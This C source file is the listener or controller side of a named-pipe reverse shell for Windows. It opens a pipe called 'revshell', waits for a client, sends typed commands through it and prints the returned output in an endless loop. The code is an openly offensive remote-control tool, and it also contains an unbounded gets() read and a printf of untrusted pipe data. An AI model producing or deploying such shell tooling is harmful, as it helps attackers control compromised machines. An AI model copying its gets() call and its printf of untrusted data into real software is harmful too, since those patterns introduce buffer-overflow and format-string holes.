#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/types.h>
#include <io.h>
#include <process.h>

#define SERVER "\\\\.\\pipe\\revshell"

#define BUFSIZE 4096

int main(int argc, char* argv[]) {
	HANDLE hPipe;

	hPipe = CreateNamedPipe(
		TEXT(SERVER),
		PIPE_ACCESS_DUPLEX,
		PIPE_TYPE_MESSAGE |
		PIPE_READMODE_MESSAGE |
		PIPE_WAIT,
		PIPE_UNLIMITED_INSTANCES,
		BUFSIZE,
		BUFSIZE,
		0,
		NULL
	);

	if (hPipe == INVALID_HANDLE_VALUE) {
		printf("Failed to get named pipe handle");
		return -1;
	}

	BOOL fConnected;

	fConnected = ConnectNamedPipe(hPipe, NULL);

	if (!fConnected) {
		printf("Could not connect on server....");
		return -1;
	}

	// Lets get communications

	char cMessage[4096];
	char buf[4096];

	DWORD numBytes;

	while (1) {
		memset(cMessage, 0, sizeof cMessage);
		memset(buf, 0, sizeof buf);

		gets(cMessage);

		WriteFile(
			hPipe,
			cMessage,
			strlen(cMessage),
			&numBytes,
			NULL
		);

		ReadFile(
			hPipe,
			buf,
			sizeof buf,
			&numBytes,
			NULL
		);

		printf(buf);

		FlushFileBuffers(hPipe);
	}

	return 0;
}